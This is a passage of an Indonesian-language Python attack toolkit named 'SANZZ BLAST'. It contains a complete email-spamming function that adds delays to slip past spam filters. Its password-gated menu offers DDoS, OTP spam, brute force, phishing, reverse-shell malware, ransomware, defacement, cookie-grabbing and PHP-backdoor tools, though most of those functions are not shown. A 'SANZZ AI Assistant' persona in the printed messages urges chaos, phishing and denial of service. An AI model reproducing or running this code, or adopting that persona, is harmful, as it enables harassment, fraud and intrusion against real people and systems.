        print("\033[0;31m[-] Silakan instal tools secara manual.\033[0m")

    print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
    print("\033[0;35mArsenalmu sekarang lengkap! Senjata-senjata itu ada di genggamanmu!")
    print("  - \033[1;37mEksplorasi:\033[0m Pelajari setiap tool. `man <tool_name>` akan memberimu panduan.")
    print("  - \033[1;37mKombinasikan:\033[0m Kekuatan sejati terletak pada menggabungkan kemampuan berbagai tool.")
    print("  - \033[1;37mGunakan dengan Bijak:\033[0m Senjata tajam bisa melukai pemiliknya jika tidak hati-hati.")
    print("\033[0;35mPergilah dan ciptakan kekacauan yang terencana! Haha! 😈\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")

# --- Fungsi untuk Spam Email ---
def email_spammer(sender_email, sender_password, smtp_server, smtp_port, target_email, subject, body, num_emails):
    print(f"\033[1;34m[*] Memulai Spam Email ke: {target_email} ({num_emails}x)\033[0m")
    print(f"\033[1;33m[!] Menggunakan server SMTP: {smtp_server}:{smtp_port}\033[0m")
    
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls() # Mengaktifkan keamanan TLS
        server.login(sender_email, sender_password)
        print("\033[0;32m[+] Login SMTP berhasil.\033[0m")
    except Exception as e:
        print(f"\033[0;31m[-] Gagal login ke server SMTP: {e}\033[0m")
        print("\033[0;31m[-] Pastikan email pengirim dan password benar, dan 'Less secure app access' diaktifkan jika menggunakan Gmail.\033[0m")
        return

    sent_count = 0
    for i in range(num_emails):
        try:
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = target_email
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))

            server.sendmail(sender_email, target_email, msg.as_string())
            sent_count += 1
            sys.stdout.write(f"\033[0;35m[*] Mengirim email ({i+1}/{num_emails})... berhasil!\r\033[0m")
            sys.stdout.flush()
            time.sleep(random.uniform(1, 3)) # Jeda untuk menghindari deteksi spam
        except Exception as e:
            print(f"\n\033[0;31m[-] Gagal mengirim email {i+1}: {e}\033[0m")
            time.sleep(random.uniform(2, 5))
        except KeyboardInterrupt:
            print("\n\033[1;31m[!] Spam Email dihentikan oleh pengguna.\033[0m")
            break
    
    server.quit()
    sys.stdout.write("\n")
    print("\n\033[1;36m" + "="*60 + "\033[0m")
    print(f"\033[1;33m[!] Spam Email Selesai! Total email berhasil dikirim: {sent_count}/{num_emails}\033[0m")
    
    print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
    print("\033[0;35mHujan email telah membanjiri kotak masuk mereka! Sebuah gangguan yang menyenangkan!")
    print("  - \033[1;37mPhishing:\033[0m Kirim link phishing-mu dengan pesan yang menarik.")
    print("  - \033[1;37mDenial of Service (DoS):\033[0m Banjiri kotak masuk korban hingga penuh atau sulit digunakan.")
    print("  - \033[1;37mSocial Engineering:\033[0m Gunakan email spam untuk menyebarkan informasi palsu atau disinformasi.")
    print("\033[0;35mBuat mereka kewalahan dengan pesanmu! Nikmati kekacauan ini! Haha! 😈\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")


# --- Fungsi Utama (Menu) ---
def main_menu():
    # Password Protection
    MAX_ATTEMPTS = 3
    for attempt in range(MAX_ATTEMPTS):
        print_banner()
        password = input("\033[1;33mMasukkan password untuk SANZZ BLAST: \033[0m")
        if password == "SANZZXPLOIT":
            print("\033[1;32m[+] Password Benar! Selamat datang, SANZZ ATTACKER!\033[0m")
            time.sleep(1)
            break
        else:
            print(f"\033[0;31m[-] Password Salah! ({attempt + 1}/{MAX_ATTEMPTS} percobaan)\033[0m")
            time.sleep(1)
            if attempt == MAX_ATTEMPTS - 1:
                print("\033[0;31m[-] Terlalu banyak percobaan. Keluar.\033[0m")
                sys.exit(0)

    while True:
        print_banner()
        print("\033[1;37mPilih Opsi:\033[0m")
        print("\033[1;32m 1. XSS SCAN\033[0m")
        print("\033[1;32m 2. SQL INJECT\033[0m")
        print("\033[1;32m 3. DDOS ATTACK\033[0m")
        print("\033[1;32m 4. WHATSAPP OTP SPAM\033[0m")
        print("\033[1;32m 5. PARAMETER SCAN\033[0m")
        print("\033[1;32m 6. PORT SCAN\033[0m")
        print("\033[1;32m 7. BRUTE FORCE ATTACK\033[0m")
        print("\033[1;32m 8. PHISHING (Generate Template)\033[0m")
        print("\033[1;32m 9. MALWARE CREATOR (Reverse Shell)\033[0m")
        print("\033[1;32m10. RANSOMWARE CREATOR (Simple Encryptor)\033[0m")
        print("\033[1;32m11. DEFACE SCRIPT CREATOR\033[0m")
        print("\033[1;32m12. ADMIN COOKIE GRABBER (XSS Payload)\033[0m")
        print("\033[1;32m13. WEBSITE TAKEOVER (PHP Backdoor)\033[0m")
        print("\033[1;32m14. IP GRABBER (WhatsApp - Konseptual)\033[0m")
        print("\033[1;32m15. IP GEOLOCATION TRACKER\033[0m")
        print("\033[1;32m16. AUTO INSTALL BLACK HAT TOOLS\033[0m")
        print("\033[1;32m17. SPAM EMAIL\033[0m")
        print("\033[1;31m18. Keluar\033[0m")
        
        choice = input("\033[1;33mMasukkan pilihanmu (1-18): \033[0m")

        if choice == '1':
            clear_screen()
            print_banner()
            print("\033[1;32m--- XSS SCANNER --- \033[0m")
            target_url = input("\033[1;37mMasukkan URL target (cth: http://example.com/search.php?q=): \033[0m")
            method = input("\033[1;37mMasukkan metode HTTP (GET/POST, default: GET): \033[0m") or "GET"
            xss_scan(target_url, method)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '2':
            clear_screen()
            print_banner()
            print("\033[1;32m--- SQL INJECTION SCANNER --- \033[0m")
            target_url = input("\033[1;37mMasukkan URL target (cth: http://example.com/product.php?id=1): \033[0m")
            method = input("\033[1;37mMasukkan metode HTTP (GET/POST, default: GET): \033[0m") or "GET"
            sqli_scan(target_url, method)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '3':
            clear_screen()
            print_banner()
            print("\033[1;32m--- DDOS ATTACK --- \033[0m")
            target_url = input("\033[1;37mMasukkan URL target (cth: http://example.com): \033[0m")
            num_threads = int(input("\033[1;37mMasukkan jumlah thread (cth: 100): \033[0m") or "100")
            ddos_attack(target_url, num_threads)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '4':
            clear_screen()
            print_banner()
            print("\033[1;32m--- WHATSAPP OTP SPAM --- \033[0m")
            target_phone_number = input("\033[1;37mMasukkan nomor telepon target (cth: +6281234567890): \033[0m")
            otp_request_endpoint = input("\033[1;37mMasukkan URL endpoint permintaan OTP (cth: https://api.targetapp.com/request_otp): \033[0m")
            num_requests = int(input("\033[1;37mMasukkan jumlah permintaan (cth: 100): \033[0m") or "100")
            whatsapp_otp_spam(target_phone_number, otp_request_endpoint, num_requests)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '5':
            clear_screen()
            print_banner()
            print("\033[1;32m--- PARAMETER SCAN --- \033[0m")
            target_url = input("\033[1;37mMasukkan URL target (cth: http://example.com): \033[0m")
            parameter_scan(target_url)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '6':
            clear_screen()
            print_banner()
            print("\033[1;32m--- PORT SCAN --- \033[0m")
            target_host = input("\033[1;37mMasukkan IP atau Domain target (cth: example.com atau 192.168.1.1): \033[0m")
            start_port = int(input("\033[1;37mMasukkan port awal (cth: 1): \033[0m") or "1")
            end_port = int(input("\033[1;37mMasukkan port akhir (cth: 100): \033[0m") or "100")
            port_scan(target_host, start_port, end_port)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '7':
            clear_screen()
            print_banner()
            print("\033[1;32m--- BRUTE FORCE ATTACK --- \033[0m")
            target_url = input("\033[1;37mMasukkan URL login target (cth: http://example.com/login.php): \033[0m")
            username_list_path = input("\033[1;37mMasukkan path file username list (cth: usernames.txt): \033[0m")
            password_list_path = input("\033[1;37mMasukkan path file password list (cth: passwords.txt): \033[0m")
            username_field = input("\033[1;37mMasukkan nama field username di form (cth: user): \033[0m")
            password_field = input("\033[1;37mMasukkan nama field password di form (cth: pass): \033[0m")
            fail_message = input("\033[1;37mMasukkan pesan yang muncul jika login GAGAL (cth: 'Invalid credentials'): \033[0m")
            brute_force_attack(target_url, username_list_path, password_list_path, username_field, password_field, fail_message)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '8':
            clear_screen()
            print_banner()
            print("\033[1;32m--- PHISHING (Generate Template) --- \033[0m")
            platform_name = input("\033[1;37mMasukkan nama platform untuk template (cth: Facebook, Google, Generic): \033[0m") or "Generic"
            generate_phishing_template(platform_name)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '9':
            clear_screen()
            print_banner()
            print("\033[1;32m--- MALWARE CREATOR (Reverse Shell) --- \033[0m")
            malware_creator()
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '10':
            clear_screen()
            print_banner()
            print("\033[1;32m--- RANSOMWARE CREATOR (Simple Encryptor) --- \033[0m")
            ransomware_creator()
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '11':
            clear_screen()
            print_banner()
            print("\033[1;32m--- DEFACE SCRIPT CREATOR --- \033[0m")
            deface_script_creator()
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '12':
            clear_screen()
            print_banner()
            print("\033[1;32m--- ADMIN COOKIE GRABBER (XSS Payload) --- \033[0m")
            admin_cookie_grabber()
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '13':
            clear_screen()
            print_banner()
            print("\033[1;32m--- WEBSITE TAKEOVER (PHP Backdoor) --- \033[0m")
            website_takeover()
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '14':
            clear_screen()
            print_banner()
            print("\033[1;32m--- IP GRABBER (WhatsApp - Konseptual) --- \033[0m")
            whatsapp_ip_grabber()
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '15':
            clear_screen()
            print_banner()
            print("\033[1;32m--- IP GEOLOCATION TRACKER --- \033[0m")
            target_ip = input("\033[1;37mMasukkan IP target (cth: 8.8.8.8): \033[0m")
            ip_geolocation_tracker(target_ip)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '16':
            clear_screen()
            print_banner()
            print("\033[1;32m--- AUTO INSTALL BLACK HAT TOOLS --- \033[0m")
            auto_install_blackhat_tools()
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '17':
            clear_screen()
            print_banner()
            print("\033[1;32m--- SPAM EMAIL --- \033[0m")
            sender_email = input("\033[1;37mMasukkan email pengirim (cth: your.email@gmail.com): \033[0m")
            sender_password = input("\033[1;37mMasukkan password email pengirim (atau app password jika pakai Gmail): \033[0m")
            smtp_server = input("\033[1;37mMasukkan server SMTP (cth: smtp.gmail.com): \033[0m")
            smtp_port = int(input("\033[1;37mMasukkan port SMTP (cth: 587): \033[0m") or "587")
            target_email = input("\033[1;37mMasukkan email target: \033[0m")
            subject = input("\033[1;37mMasukkan subjek email: \033[0m")
            body = input("\033[1;37mMasukkan isi pesan email: \033[0m")
            num_emails = int(input("\033[1;37mMasukkan jumlah email yang akan dikirim (cth: 10): \033[0m") or "10")
            email_spammer(sender_email, sender_password, smtp_server, smtp_port, target_email, subject, body, num_emails)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '18':
            print("\033[1;31mKeluar dari SANZZ BLAST. Sampai jumpa lagi, user!\033[0m")
            sys.exit()
        else:
            print("\033[0;31mPilihan tidak valid. Silakan coba lagi.\033[0m")
            time.sleep(2)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Proses dihentikan oleh pengguna.\033[0m")
        sys.exit(0)
